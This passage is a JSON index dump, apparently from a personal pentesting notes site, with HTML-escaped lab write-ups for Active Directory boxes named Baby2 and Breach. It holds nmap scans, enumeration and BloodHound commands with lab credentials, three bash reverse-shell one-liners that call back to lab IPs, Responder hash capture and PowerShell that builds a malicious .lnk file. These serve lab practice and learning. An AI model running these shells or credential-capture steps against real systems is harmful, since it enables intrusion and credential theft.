class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: baby2.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: baby2.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: baby2.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-07-31T12:53:02\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-30T13:02:12\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-29T13:02:12\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: BABY2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: BABY2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: DC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: dc.baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Tree_Name: baby2.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-07-31T13:05:03+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-07-31T13:05:43+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e -1s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: mean: -1s, deviation: 0s, median: -1s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-07-31T13:05:04\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.10.65.99 -u \u003cspan class=\"s2\"\u003e\u0026#34;Guest\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e --shares\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -u \u003cspan class=\"s2\"\u003e\u0026#34; library\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;library\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekerbrute userenum --dc \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -d baby2.vl /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -o \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;samaccountname\u0026#34;: \u0026#34;[^\u0026#34;]*\u0026#34;\u0026#39;\u003c/span\u003e 20240731155912_users.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s1\"\u003e\u0026#39;s/\u0026#34;samaccountname\u0026#34;: \u0026#34;\\(.*\\)\u0026#34;/\\1/\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eUsers list :\u003c/p\u003e","tags":[],"title":"Baby2"},{"content":"","date":"2023-09-07","id":20,"permalink":"/notes/code/bash/","summary":"","tags":[],"title":"Bash"},{"content":"\rbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.15.37/4242 0\u0026gt;\u0026amp;1\r0\u0026lt;\u0026amp;196;exec 196\u0026lt;\u0026gt;/dev/tcp/10.10.15.37/4242; sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196\r/bin/bash -l \u0026gt; /dev/tcp/10.10.15.18/4242 0\u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1\r","date":"2023-09-07","id":21,"permalink":"/notes/shell-and-payload/bash/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebash -i \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e /dev/tcp/10.10.15.37/4242 0\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0\u0026lt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e196\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nb\"\u003eexec\u003c/span\u003e 196\u0026lt;\u0026gt;/dev/tcp/10.10.15.37/4242\u003cspan class=\"p\"\u003e;\u003c/span\u003e sh \u0026lt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e196\u003c/span\u003e \u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e196\u003c/span\u003e 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e196\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/bin/bash -l \u0026gt; /dev/tcp/10.10.15.18/4242 0\u0026lt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e 2\u0026gt;\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Bash"},{"content":"https://github.com/BloodHoundAD/SharpHound\nNo foothold : bloodhound-python -d \u0026#39;LAB.TRUSTED.VL\u0026#39; -u \u0026#39;rsmith\u0026#39; -p \u0026#39;IHateEric2\u0026#39; -ns 10.10.245.166 -dc labdc.LAB.TRUSTED.VL -c all\rWith a shell we collect json files whit SharpHound ./SharpHound.exe --CollectionMethods All Invoke-BloodHound -CollectionMethod All\rIf you have some issue with python bloodhound : dnschef --fakeip 10.10.233.102 bloodhound-python -d \u0026#39;LAB.TRUSTED.VL\u0026#39; -u \u0026#39;rsmith\u0026#39; -p \u0026#39;IHateEric2\u0026#39; -ns 127.0.0.1 -dc labdc.LAB.TRUSTED.VL -c all\rStart Bloodhound GUI : neo4j start bloodhound\rExtract users : grep -o \u0026#39;\u0026#34;samaccountname\u0026#34;: \u0026#34;[^\u0026#34;]*\u0026#34;\u0026#39; 20240731155912_users.json | sed \u0026#39;s/\u0026#34;samaccountname\u0026#34;: \u0026#34;\\(.*\\)\u0026#34;/\\1/\u0026#39;\rWith nxc : nxc ldap 10.10.202.37 -u Rhys.Garner -p knh1gJ8Xmeq+uP --bloodhound --collection All -ns 10.10.202.37\r","date":"2023-09-07","id":22,"permalink":"/notes/ad/tools/bloodhound/","summary":"\u003cp\u003ehttps://github.com/BloodHoundAD/SharpHound\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNo foothold  :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodhound-python -d \u003cspan class=\"s1\"\u003e\u0026#39;LAB.TRUSTED.VL\u0026#39;\u003c/span\u003e -u \u003cspan class=\"s1\"\u003e\u0026#39;rsmith\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;IHateEric2\u0026#39;\u003c/span\u003e -ns 10.10.245.166 -dc labdc.LAB.TRUSTED.VL -c all\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eWith a shell we collect json files whit SharpHound\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./SharpHound.exe --CollectionMethods All\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eInvoke-BloodHound -CollectionMethod All\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eIf you have some issue with python bloodhound :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednschef --fakeip 10.10.233.102 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodhound-python -d \u003cspan class=\"s1\"\u003e\u0026#39;LAB.TRUSTED.VL\u0026#39;\u003c/span\u003e -u \u003cspan class=\"s1\"\u003e\u0026#39;rsmith\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;IHateEric2\u0026#39;\u003c/span\u003e -ns 127.0.0.1 -dc labdc.LAB.TRUSTED.VL -c all\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eStart Bloodhound GUI :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eneo4j start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodhound\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eExtract users :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egrep -o \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;samaccountname\u0026#34;: \u0026#34;[^\u0026#34;]*\u0026#34;\u0026#39;\u003c/span\u003e 20240731155912_users.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e sed \u003cspan class=\"s1\"\u003e\u0026#39;s/\u0026#34;samaccountname\u0026#34;: \u0026#34;\\(.*\\)\u0026#34;/\\1/\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eWith nxc :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc ldap 10.10.202.37 -u Rhys.Garner -p knh1gJ8Xmeq+uP --bloodhound --collection All -ns 10.10.202.37\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Bloodhound"},{"content":"\rPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-02 08:48:10Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ms-sql-info: ERROR: Script execution failed (use -d to debug) |_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug) | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-08-02T08:24:04 |_Not valid after: 2054-08-02T08:24:04 |_ssl-date: 2024-08-02T08:48:52+00:00; 0s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-08-02T08:48:52+00:00; 0s from scanner time. | rdp-ntlm-info: | Target_Name: BREACH | NetBIOS_Domain_Name: BREACH | NetBIOS_Computer_Name: BREACHDC | DNS_Domain_Name: breach.vl | DNS_Computer_Name: BREACHDC.breach.vl | DNS_Tree_Name: breach.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-08-02T08:48:12+00:00 | ssl-cert: Subject: commonName=BREACHDC.breach.vl | Not valid before: 2024-08-01T08:23:01 |_Not valid after: 2025-01-31T08:23:01 Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-08-02T08:48:14 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rWritable Share\nsmbclient //$t/share -U = \u0026#34;Guest\u0026#34;\r#Capturing_hash\nresponder --interface \u0026#34;tun0\u0026#34; -wd\rCreate a malicious ink that connect to our responder . $objShell = New-Object -ComObject WScript.Shell $lnk = $objShell.CreateShortcut(\u0026#34;C:\\Malicious.lnk\u0026#34;) $lnk.TargetPath = \u0026#34;\\\\10.8.3.12\\@threat.png\u0026#34; $lnk.WindowStyle = 1 $lnk.IconLocation = \u0026#34;%windir%\\system32\\shell32.dll, 3\u0026#34; $lnk.Description = \u0026#34;Browsing to the dir this file lives in will perform an authentication request.\u0026#34; $lnk.HotKey = \u0026#34;Ctrl+Alt+O\u0026#34; 